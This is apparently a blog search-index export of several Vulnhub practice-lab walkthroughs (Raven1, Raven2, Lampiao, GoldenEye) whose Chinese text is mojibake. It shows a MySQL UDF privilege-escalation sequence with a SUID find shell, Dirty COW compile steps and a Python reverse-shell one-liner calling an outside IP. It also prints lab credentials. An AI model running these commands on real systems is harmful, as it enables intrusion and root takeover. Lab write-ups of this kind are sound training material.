<p>findæ‰¾flag è®¿é—® æˆ‘ä»¬ç›®æ ‡æ‹¿root ä¸èµ˜è¿°äº†</p>
<p><img src="/2020/03/02/Raven2/image-20200302144523146.png" alt="image-20200302144523146"></p>
<p><img src="/2020/03/02/Raven2/image-20200302144539076.png" alt="image-20200302144539076"></p>
<h1 id="0x02-ç™»æ•°æ®åº“"><a href="#0x02-ç™»æ•°æ®åº“" class="headerlink" title="0x02 ç™»æ•°æ®åº“"></a><strong>0x02 ç™»æ•°æ®åº“</strong></h1><p>è¿˜æ˜¯è€è§„çŸ© wordpressé…ç½®æ–‡ä»¶æ‹¿å¸å· </p>
<p><img src="/2020/03/02/Raven2/image-20200302144755036.png" alt="image-20200302144755036"></p>
<p>ç™»ä¸Šå»å Raven1é‡Œæ˜¯è¡¨é‡Œæ‹¿å¸å·è§£å¯† ssh è¿™é‡Œä¸è¡Œ å°±ä¸å±•ç¤ºäº† è¦èµ°mysql udfææƒ</p>
<h1 id="0x03-mysql-udfææƒ"><a href="#0x03-mysql-udfææƒ" class="headerlink" title="0x03 mysql udfææƒ"></a><strong>0x03 mysql udfææƒ</strong></h1><p>Exploit-db ğŸ”— <a href="https://www.exploit-db.com/exploits/1518" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/1518</a></p>
<p>kaliæœä¸€ä¸‹ä¹Ÿè¡Œ </p>
<p><img src="/2020/03/02/Raven2/image-20200302145836960.png" alt="image-20200302145836960"></p>
<p>æœ¬åœ°ç¼–è¯‘</p>
<p>gcc -g -c 1518.c</p>
<p>gcc -g -shared -o  1518.so 1518.o -lc</p>
<p><img src="/2020/03/02/Raven2/image-20200302150816621.png" alt="image-20200302150816621"></p>
<p>å¼€ä¸ªhttp wgetè½åœ°</p>
<p>å¼€å§‹ææƒ</p>
<p>ç…§ç€æ“ä½œå³å¯</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| wordpress          |</span><br><span class="line">+--------------------+</span><br><span class="line"><span class="number">4</span> <span class="function">rows <span class="keyword">in</span> <span class="title">set</span> (<span class="params"><span class="number">0.01</span> sec</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">mysql&gt; use wordpress</span>;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table and column names</span><br><span class="line">You can turn off <span class="keyword">this</span> feature to <span class="keyword">get</span> a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; <span class="function">create table <span class="title">foo</span>(<span class="params">line blob</span>)</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="function">rows <span class="title">affected</span> (<span class="params"><span class="number">0.12</span> sec</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">mysql&gt; insert <span class="keyword">into</span> foo <span class="title">values</span>(<span class="params">load_file(<span class="string">'/var/www/html/1518.so'</span></span>))</span>;</span><br><span class="line">Query OK, <span class="number">1</span> <span class="function">row <span class="title">affected</span> (<span class="params"><span class="number">0.12</span> sec</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> foo <span class="keyword">into</span> dumpfile '/usr/lib/mysql/plugin/1518.so'</span>;</span><br><span class="line">Query OK, <span class="number">1</span> <span class="function">row <span class="title">affected</span> (<span class="params"><span class="number">0.03</span> sec</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">mysql&gt; create function do_system returns integer soname '1518.so'</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="function">rows <span class="title">affected</span> (<span class="params"><span class="number">0.11</span> sec</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> mysql.func</span>;</span><br><span class="line">+-----------+-----+---------+----------+</span><br><span class="line">| name      | ret | dl      | type     |</span><br><span class="line">+-----------+-----+---------+----------+</span><br><span class="line">| do_system |   <span class="number">2</span> | <span class="number">1518.</span>so | function |</span><br><span class="line">+-----------+-----+---------+----------+</span><br><span class="line"><span class="number">1</span> <span class="function">row <span class="keyword">in</span> <span class="title">set</span> (<span class="params"><span class="number">0.00</span> sec</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">mysql&gt; <span class="keyword">select</span> <span class="title">do_system</span>(<span class="params"><span class="string">'chmod u+s /usr/bin/find'</span></span>)</span>;</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| do_system(<span class="string">'chmod u+s /usr/bin/find'</span>) |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">|                                    <span class="number">0</span> |</span><br><span class="line">+--------------------------------------+</span><br><span class="line"><span class="number">1</span> <span class="function">row <span class="keyword">in</span> <span class="title">set</span> (<span class="params"><span class="number">0.01</span> sec</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">mysql&gt; quit</span></span><br><span class="line"><span class="function">Bye</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">touch foo</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">find foo -exec 'whoami' \</span>;</span><br><span class="line"></span><br><span class="line">find foo -exec <span class="string">'/bin/sh'</span> \;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/02/Raven2/image-20200302151918277.png" alt="image-20200302151918277"></p>
<p>æ­å–œé—¯å…³æˆåŠŸï¼</p>
]]></content>
      <categories>
        <category>é¶æœº</category>
      </categories>
      <tags>
        <tag>Vulnhub é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>Raven1</title>
    <url>/2020/03/01/Raven1/</url>
    <content><![CDATA[<h1 id="0X00-ä¿¡æ¯æ”¶é›†"><a href="#0X00-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0X00 ä¿¡æ¯æ”¶é›†"></a><strong>0X00 ä¿¡æ¯æ”¶é›†</strong></h1><p><img src="/2020/03/01/Raven1/image-20200301234057318.png" alt="image-20200301234057318"></p>
<p><img src="/2020/03/01/Raven1/image-20200301234200183.png" alt="image-20200301234200183"></p>
<p>80æ’¬å®ƒ è­¦å¯Ÿå§å§ æˆ‘æ˜¯æ­£è§„çš„å®‰å…¨å·¥ç¨‹å¸ˆå“¦ </p>
<p><img src="/2020/03/01/Raven1/image-20200301234302966.png" alt="image-20200301234302966"></p>
<p>æ‰«ä¸€ä¸‹ç›®å½•</p>
<p><img src="/2020/03/01/Raven1/image-20200301234349002.png" alt="image-20200301234349002"></p>
<p>ok  <a href="http://172.16.24.37/service.html" target="_blank" rel="noopener">http://172.16.24.37/service.html</a> æ‹¿åˆ°äº†ç¬¬ä¸€ä¸ªflagï¼Œåœ¨æºä»£ç 262è¡Œå¤„</p>
<p><img src="/2020/03/01/Raven1/image-20200301234534546.png" alt="image-20200301234534546"></p>
<h1 id="0x01-è·å–å¸å·"><a href="#0x01-è·å–å¸å·" class="headerlink" title="0x01 è·å–å¸å·"></a><strong>0x01 è·å–å¸å·</strong></h1><p>æ‰«ç›®å½•æœ‰ä¸ªåœ°æ–¹æ˜¯wordpress</p>
<p>é‚£ä¹ˆwpscanå¼€æ€¼ è´¦å·æ‹¿åˆ°</p>
<p><img src="/2020/03/01/Raven1/image-20200302005818194.png" alt="image-20200302005818194"></p>
<p>/var/www/ä¸‹æ‰¾åˆ° flag2</p>
<p><img src="/2020/03/01/Raven1/image-20200302010009561.png" alt="image-20200302010009561"></p>
<p>æ‹¿æ•°æ®åº“è´¦å·</p>
<p><img src="/2020/03/01/Raven1/image-20200302010223595.png" alt="image-20200302010223595"></p>
<p><img src="/2020/03/01/Raven1/image-20200302010258471.png" alt="image-20200302010258471"></p>
<p>mysqlè´¦æˆ·å¯†ç ä¸ºï¼šâ€œrootâ€ã€â€œR<a href="https://github.com/v3nSecurity" target="_blank" rel="noopener">@v3nSecurity</a>â€</p>
<p>ç™»é™† selectå’”å’”ä¸€æ³¢</p>
<p><img src="/2020/03/01/Raven1/image-20200302010848864.png" alt="image-20200302010848864"></p>
<p><a href="https://www.somd5.com/" target="_blank" rel="noopener">https://www.somd5.com/</a>  å¹²å°±å®Œäº† å¥¥åˆ©ç»™</p>
<p><img src="/2020/03/01/Raven1/image-20200302011129407.png" alt="image-20200302011129407"></p>
<p>å¾—åˆ°<code>steven</code>å¯†ç ä¸º<code>pink84</code></p>
<h1 id="0x02-pythonææƒ"><a href="#0x02-pythonææƒ" class="headerlink" title="0x02 pythonææƒ"></a><strong>0x02 pythonææƒ</strong></h1><p>suè¿‡å» pythonåˆ‡åˆ°/bin/bash å¤§å“¥æå®šï¼</p>
<p><img src="/2020/03/01/Raven1/image-20200302011456706.png" alt="image-20200302011456706"></p>
<p>è¿˜æœ‰å…¶ä»–æ€è·¯å…¶å®</p>
<p>å­˜åœ¨<code>CVE-2016-6662 mysql</code>è¿œç¨‹ä»£ç æ‰§è¡Œ/æƒé™æå‡æ¼æ´<br>è¿˜å¯ä»¥<code>UDF</code>ææƒ</p>
]]></content>
      <categories>
        <category>é¶æœº</category>
      </categories>
      <tags>
        <tag>Vulnhub é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>Lampiao</title>
    <url>/2020/03/01/Lampiao/</url>
    <content><![CDATA[<h1 id="0x00-ä¿¡æ¯æ”¶é›†"><a href="#0x00-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x00 ä¿¡æ¯æ”¶é›†"></a><strong>0x00 ä¿¡æ¯æ”¶é›†</strong></h1><p>è€ç”Ÿå¸¸è°ˆ</p>
<p><img src="/2020/03/01/Lampiao/image-20200301164232495.png" alt="image-20200301164232495"></p>
<p><img src="/2020/03/01/Lampiao/image-20200301164422065.png" alt="image-20200301164422065"></p>
<p>1898çœ‹ä¸€ä¸‹å–½ ç”¨çš„googleæ’ä»¶ çœ‹åˆ°äº†cmsæ˜¯Drupal7,å…·ä½“æ˜¯ä»€ä¹ˆå°ç‰ˆæœ¬å‘¢ï¼Ÿæ¥ä¸‹æ¥çœ‹</p>
<p><img src="/2020/03/01/Lampiao/image-20200301164729523.png" alt="image-20200301164729523"></p>
<p>å¸¸è§„æ€è·¯ è¦æ‰«æçš„ è¿™é‡Œä¸å±•ç¤ºäº† çœ‹ä¸‹é˜²çˆ¬ æœ‰ä¸ªæ—¥å¿—æ–‡ä»¶ æœ€åä¸€æ¬¡æ›´æ–°å°ç‰ˆæœ¬54</p>
<p>è¿™ä¸ªæ˜¯RCEçš„ CVEç¼–å·CVE-2018-7600 pocæ„é€ é™„ä¸Š <a href="https://paper.seebug.org/567/" target="_blank" rel="noopener">https://paper.seebug.org/567/</a></p>
<p><img src="/2020/03/01/Lampiao/image-20200301165005159.png" alt="image-20200301165005159"></p>
<p><img src="/2020/03/01/Lampiao/image-20200301165045429.png" alt="image-20200301165045429"></p>
<p>msfå¯åŠ¨ searchåˆ°äº†drupal å°±ä½ äº†å››å·ç§å­é€‰æ‰‹</p>
<p><img src="/2020/03/01/Lampiao/image-20200301165434860.png" alt="image-20200301165434860"></p>
<h1 id="0x01-è·å–ä¼šè¯"><a href="#0x01-è·å–ä¼šè¯" class="headerlink" title="0x01 è·å–ä¼šè¯"></a><strong>0x01 è·å–ä¼šè¯</strong></h1><p><img src="/2020/03/01/Lampiao/image-20200301165628660.png" alt="image-20200301165628660"></p>
<p>ç”±äºæˆ‘ä»¬è·å–çš„shellå¹¶ä¸æ˜¯ä¸€ä¸ªå…·æœ‰å®Œæ•´äº¤äº’çš„shellï¼Œå¯¹äºå·²ç»å®‰è£…äº†pythonçš„ç³»ç»Ÿï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨pythonæä¾›çš„ptyæ¨¡å—ï¼Œåªéœ€è¦ä¸€è¡Œè„šæœ¬å°±å¯ä»¥åˆ›å»ºä¸€ä¸ªåŸç”Ÿçš„ç»ˆç«¯ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
<p><img src="/2020/03/01/Lampiao/image-20200301165741613.png" alt="image-20200301165741613"></p>
<h1 id="0x02-å¯»æ‰¾çªç ´"><a href="#0x02-å¯»æ‰¾çªç ´" class="headerlink" title="0x02 å¯»æ‰¾çªç ´"></a><strong>0x02 å¯»æ‰¾çªç ´</strong></h1><p>htmlè·¯å¾„ä¸‹çš„å››ä¸ªæ–‡ä»¶ ä¼ å›æ¥æŸ¥çœ‹</p>
<ol>
<li>qrc.pngï¼šä¸€ä¸ªäºŒç»´ç ï¼Œæ‰«å‡ºæ¥çš„ç»“æœæ˜¯ Try harger! muahuahuahuaï¼Œè¢«ä½œè€…é¼“åŠ±äº†ã€‚ã€‚</li>
<li>audio.m4aï¼šæç¤ºä¸ºuser tiagoï¼Œè¯´æ˜è¦å…ˆæ‰¾åˆ°ç”¨æˆ·tiagoçš„å¯†ç </li>
<li>uizGonzaga-LampiaoFalou.mp3ï¼šä¸€é¦–éŸ³ä¹ï¼Œä¸¢å…¥éšå†™å·¥å…·æ²¡å‘ç°ä»€ä¹ˆå¼‚å¸¸</li>
<li>lampiao.jpgï¼šä¸€å¼ ç‰›ä»”çš„å›¾ç‰‡ï¼Œä¸¢å…¥binwlakä¸­æœªå‘ç°æœ‰ä»€ä¹ˆéšå†™</li>
</ol>
<p>var/www/html/sites/defaultç›®å½•ä¸‹æ‰¾åˆ°é…ç½®æ–‡ä»¶settings.phpï¼Œå‘ç°æ•æ„Ÿä¿¡æ¯ï¼Œtiagoä»¥åŠå¯†ç ï¼Œå¾ˆæœ‰å¯èƒ½å°±æ˜¯å…¶ç³»ç»Ÿç”¨æˆ·tiagoçš„å¯†ç </p>
<p><img src="/2020/03/01/Lampiao/image-20200301170402837.png" alt="image-20200301170402837"></p>
<h1 id="0x03-è·å–æ™®é€šæƒé™"><a href="#0x03-è·å–æ™®é€šæƒé™" class="headerlink" title="0x03 è·å–æ™®é€šæƒé™"></a><strong>0x03 è·å–æ™®é€šæƒé™</strong></h1><p>å…¶å®rootåŠ æ•°æ®åº“å¯†ç ä¹Ÿä¸Šå»äº† </p>
<p><img src="/2020/03/01/Lampiao/image-20200301170722270.png" alt="image-20200301170722270"></p>
<p><img src="/2020/03/01/Lampiao/image-20200301170854563.png" alt="image-20200301170854563"></p>
<p>ç¿»æ¥è¦†å»æ€ä¹ˆä¹Ÿæ²¡æŠ˜è…¾åˆ°ä¸»æœºrootæƒé™ çœ‹ä¸‹å†…æ ¸å§ è¯´ä¸å®šèƒ½è„ç‰›å‘¢</p>
<p><img src="/2020/03/01/Lampiao/image-20200301171113982.png" alt="image-20200301171113982"></p>
<p>è¯´å•¥æ¥å•¥ å“ˆå“ˆ </p>
<h1 id="0x03-dirty-cowææƒ"><a href="#0x03-dirty-cowææƒ" class="headerlink" title="0x03 dirty cowææƒ"></a><strong>0x03 dirty cowææƒ</strong></h1><p>exploit-dbç»™äº†exp ğŸ”— <a href="https://www.exploit-db.com/exploits/40847" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/40847</a></p>
<p>æˆ‘ç”¨çš„msfé‡Œçš„</p>
<p><img src="/2020/03/01/Lampiao/image-20200301173935106.png" alt="image-20200301173935106"></p>
<p><img src="/2020/03/01/Lampiao/image-20200301173909301.png" alt="image-20200301173909301"></p>
<p>pythonå¼€ä¸ªhttp é¶æœºwgetä¸‹è½½</p>
<p><img src="/2020/03/01/Lampiao/image-20200301174353272.png" alt="image-20200301174353272"></p>
<p>ç¼–è¯‘ä¸€ä¸‹ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o 40847 40847.cpp -lutil</p>
<p>./40847</p>
<p>æ‰§è¡ŒæˆåŠŸï¼Œrootç”¨æˆ·éœ€è¦ç”¨dirtyCowFunå¯†ç ç™»å½•æœåŠ¡å™¨ã€‚</p>
<p>sshé‡æ–°è¿æ¥ï¼Œç”¨æˆ·ä¸ºrootï¼Œå¯†ç ä¸ºdirtyCowFun</p>
<p><img src="/2020/03/01/Lampiao/image-20200301174535764.png" alt="image-20200301174535764"></p>
<h1 id="0x04-æ‹¿åˆ°flag"><a href="#0x04-æ‹¿åˆ°flag" class="headerlink" title="0x04 æ‹¿åˆ°flag"></a><strong>0x04 æ‹¿åˆ°flag</strong></h1><p><img src="/2020/03/01/Lampiao/image-20200301174904144.png" alt="image-20200301174904144"></p>
]]></content>
      <categories>
        <category>é¶æœº</category>
      </categories>
      <tags>
        <tag>Vulnhub é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>GoldenEye</title>
    <url>/2020/02/29/GoldenEye/</url>
    <content><![CDATA[<h1 id="0x00-çŸ¥è¯†è¦ç‚¹"><a href="#0x00-çŸ¥è¯†è¦ç‚¹" class="headerlink" title="0x00 çŸ¥è¯†è¦ç‚¹"></a><strong>0x00 çŸ¥è¯†è¦ç‚¹</strong></h1><p>1.jsä¿¡æ¯æ³„éœ²<br>2.hydraçˆ†ç ´pop3æœåŠ¡<br>3.ç™»é™†pop3æœåŠ¡ï¼ˆncï¼Œlistï¼Œretrï¼‰<br>4.moodleå¹³å°<br>5.æ‹¼å†™æ£€æŸ¥getshell<br>6.Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - â€˜overlayfsâ€™ Local Privilege Escalationææƒ</p>
<h1 id="0x01-ä¿¡æ¯æ”¶é›†"><a href="#0x01-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x01 ä¿¡æ¯æ”¶é›†"></a><strong>0x01 ä¿¡æ¯æ”¶é›†</strong></h1><p>æ²¡ä»€ä¹ˆè¯´çš„ nmapå¼€è·¯</p>
<p><img src="/2020/02/29/GoldenEye/image-20200229153745956.png" alt="image-20200229153745956"></p>
<p><img src="/2020/02/29/GoldenEye/image-20200229164431947.png" alt="image-20200229164431947"></p>
<p>80ç«¯å£</p>
<p><img src="/2020/02/29/GoldenEye/image-20200229164431947.png" alt="image-20200229164431947"></p>
<p>é‚£ä¹ˆæˆ‘ä»¬å°±å°è¯•è®¿é—®ä¸‹å§</p>
<p><img src="/2020/02/29/GoldenEye/image-20200229154627261.png" alt="image-20200229154627261"></p>
<p>CTFçš„å¸¸è§„æ€è·¯ çœ‹é¡µé¢æºç </p>
<p><img src="/2020/02/29/GoldenEye/image-20200229154847054.png" alt="image-20200229154847054"></p>
<p>å‘ç°ä¸ªjs è·Ÿè¿‡å» çœ‹çœ‹æˆ‘çœ‹åˆ°äº†ä»€ä¹ˆ</p>
<p>ä¸¤ä¸ªäººå Natalyaå’ŒBoris</p>
<p>ç¼–ç è§£ç åå¾—åˆ°å¯†ç  InvincibleHack3r</p>
<p><img src="/2020/02/29/GoldenEye/image-20200229155010107.png" alt="image-20200229155010107"></p>
<p>è¿™é‡Œæ³¨æ„ é€šè¿‡å°å†™çš„borisåŠ å¯†ç æ‰èƒ½ç™»é™†è¿›å»</p>
<p><img src="/2020/02/29/GoldenEye/image-20200229160731176.png" alt="image-20200229160731176"></p>
<p>æ–‡ä¸­æ„æ€pop3åœ¨5ä¸‡å¤šçš„ç«¯å£ï¼Œhydraçˆ†å®ƒï¼</p>
<p><img src="/2020/02/29/GoldenEye/image-20200229170142495.png" alt="image-20200229170142495"></p>
<p>æ‹¿åˆ°è´¦å· ncå»è¿</p>
<p><img src="/2020/02/29/GoldenEye/image-20200229171304311.png" alt="image-20200229171304311"></p>
<p>æ–‡ä»¶2å‘ç°ä¿¡æ¯</p>
<p><img src="/2020/02/29/GoldenEye/image-20200229171414370.png" alt="image-20200229171414370"></p>
<p><img src="/2020/02/29/GoldenEye/image-20200229171706959.png" alt="image-20200229171706959"></p>
<p>æ—¢ç„¶å‘Šè¯‰äº† é‚£ä¹ˆå°±æ‰§è¡Œå§ è®¾ç½®ä¸‹æœ¬åœ°hosts å¦åˆ™å…¬ç½‘è¿™ä¸ªåŸŸåå¯ä¸æ˜¯ä»€ä¹ˆå¥½ç½‘ç«™ å˜¿å˜¿</p>
<p>ç”¨ç»™çš„è´¦å·å¯†ç ç™»å½•ä¸Šå» </p>
<p><img src="/2020/02/29/GoldenEye/image-20200229173757810.png" alt="image-20200229173757810"></p>
<p>çŸ¥é“äº†è¿™ä¸ªåšå£«ä¹Ÿæœ‰pop3è´¦å· é‚£ä¹ˆç»§ç»­çˆ†ä»–</p>
<p>çˆ†å®Œç»§ç»­ncè¿pop3 è€è½¨è¿¹ çœ‹é‚®ä»¶ æ‹¿åˆ°webè´¦å·</p>
<p><img src="/2020/02/29/GoldenEye/image-20200229175240633.png" alt="image-20200229175240633"></p>
<p>ç™»ä¸Šå»å‘ç°txtæ–‡ä»¶</p>
<p><img src="/2020/02/29/GoldenEye/image-20200229175804918.png" alt="image-20200229175804918"></p>
<p>ä¸‹è½½ä¸‹æ¥ çœ‹ä¸‹æ–‡ä»¶å±æ€§ </p>
<p><img src="/2020/02/29/GoldenEye/image-20200229180717132.png" alt="image-20200229180717132"></p>
<p>base64è§£å¯† è„‘æ´ä¸€ä¸‹ é¦–é¡µè¯´æœ‰adminè´¦æˆ· ç»“åˆè¿™ä¸ª ç™»ä¸€ä¸‹</p>
<p><img src="/2020/02/29/GoldenEye/image-20200229181059568.png" alt="image-20200229181059568"></p>
<p>adminæƒé™è¿˜æŒºå¤§ pythonå¼¹shell ncæ¥ç€</p>
<p>pocè¿™é‡Œ ipç«¯å£æ¢ä¸€ä¸‹ </p>
<p>python -c â€˜import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((â€œ192.168.43.201â€,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(â€œ/bin/bashâ€)â€™</p>
<p><img src="/2020/02/29/GoldenEye/image-20200229181554758.png" alt="image-20200229181554758"></p>
<p>ç½‘ç«™ä¸€äº›é…ç½®è¦æ”¹å¦åˆ™å¼¹ä¸å‡ºæ¥</p>
<p><img src="/2020/02/29/GoldenEye/233.png" alt="233"></p>
<p>ç‚¹è¿™ä¸ªå€’ä¸‰è§’ </p>
<h1 id="0x02-å¼€å§‹åè¿"><a href="#0x02-å¼€å§‹åè¿" class="headerlink" title="0x02 å¼€å§‹åè¿"></a><strong>0x02 å¼€å§‹åè¿</strong></h1><p><img src="/2020/02/29/GoldenEye/3334.png" alt="3334"></p>
<p><img src="/2020/02/29/GoldenEye/image-20200229182613818.png" alt="image-20200229182613818"></p>
<p>çœ‹ä¸‹å†…æ ¸ å¥½åƒå¯ä»¥ææƒ expå»exploit dbå°±è¡Œ</p>
<p><img src="/2020/02/29/GoldenEye/image-20200229190909045.png" alt="image-20200229190909045"></p>
<p>é¶æœºæ²¡gccç¯å¢ƒ è¦æ”¹ä¸‹exp  gccæ”¹æˆccä»…è¿™ä¸€å¤„å³å¯</p>
<p><img src="/2020/02/29/GoldenEye/image-20200229191330300.png" alt="image-20200229191330300"></p>
<p>pythonèµ·ä¸ªhttp wgetè¿‡å» expæ”¾ç€ä¸‹é¢ è®¿é—®è·¯å¾„è¦æ³¨æ„ è¿™é‡Œæˆ‘å¤±è¯¯äº†å‡ æ¬¡</p>
<p><img src="/2020/02/29/GoldenEye/image-20200229192156502.png" alt="image-20200229192156502"></p>
<p>ç¼–è¯‘ä¸€ä¸‹ ç»™ä¸ªæƒé™ </p>
<h1 id="0x03-ææƒæˆåŠŸ"><a href="#0x03-ææƒæˆåŠŸ" class="headerlink" title="0x03 ææƒæˆåŠŸ"></a><strong>0x03 ææƒæˆåŠŸ</strong></h1><p><img src="/2020/02/29/GoldenEye/image-20200229192551692.png" alt="image-20200229192551692"></p>
<p><img src="/2020/02/29/GoldenEye/image-20200229192806714.png" alt="image-20200229192806714"></p>
<p>è®¿é—®ä¸‹è·¯å¾„ æ­¤æ—¶bgmå“èµ· é¢˜æä¸é”™å¾ˆæœ‰æ„æ€</p>
<p><img src="/2020/02/29/GoldenEye/111.jpeg" alt="111"></p>
]]></content>
      <categories>
        <category>é¶æœº</category>
      </categories>
      <tags>
        <tag>Vulnhub é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>About me</title>
    <url>/2020/02/28/About%20me/</url>
    <content><![CDATA[<p>|     A Hackerï¼Œlive in Beijingï¼ŒChina.</p>
<p>å§“åï¼šloki<br>ç°å±…ï¼šåŒ—äº¬<br>Githubï¼šaooboo<br>å¾®ä¿¡ï¼šIFBBPROkyle</p>
<p><img src="/2020/02/28/About%20me/WechatIMG6.jpeg" alt="image-20200314161936240"></p>
]]></content>
  </entry>
</search>
